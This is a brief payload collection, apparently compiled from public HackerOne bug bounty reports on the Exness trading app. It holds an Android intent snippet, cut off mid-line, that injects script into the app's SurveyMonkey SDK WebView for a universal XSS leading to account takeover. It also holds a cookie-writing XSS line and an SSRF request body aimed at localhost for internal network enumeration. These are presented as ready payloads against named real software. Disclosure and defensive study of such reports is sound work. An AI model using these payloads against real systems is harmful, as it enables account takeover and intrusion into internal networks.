# EXNESS

3 payloads.

### `67ab4ffe`

```
Intent exnessIntent = getPackageManager().getLaunchIntentForPackage("com.exness.investments");
startActivity(exnessIntent);
final Intent intent = new Intent("android.intent.action.VIEW");
intent.putExtra("smSPageHTML", "<h1>Exploited</h1><script>location.href='/r/'</script>");
intent.putExtra("smSPageURL", "https://target.com/r/");
try {
    intent.setClassName(createPackageContext("com.exness.investments", Context.CONTEXT_IGNORE_SECURITY), "com.surveymonkey.surveymonkeyandroidsdk.SMFeedback
```

**Parameter:** `smSPageHTML`
— [Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover](https://hackerone.com/reports/1455987) · EXNESS · [holyfield](https://hackerone.com/holyfield)

### `7f83622f`

```
<script>document.write(document.cookies)</script>
```

— [Improper Implementation of SDK Allows Universal XSS in Webview Leading to Account Takeover](https://hackerone.com/reports/1455987) · EXNESS · [holyfield](https://hackerone.com/holyfield)

### `b301f07e`

```
{"data":{"url":"https://127.0.0.1:80"}}
```

**Parameter:** `url`
— [Blind SSRF on https://target.com/ allows for internal network enumeration](https://hackerone.com/reports/1832494) · EXNESS · [null_hypothesis](https://hackerone.com/null_hypothesis)
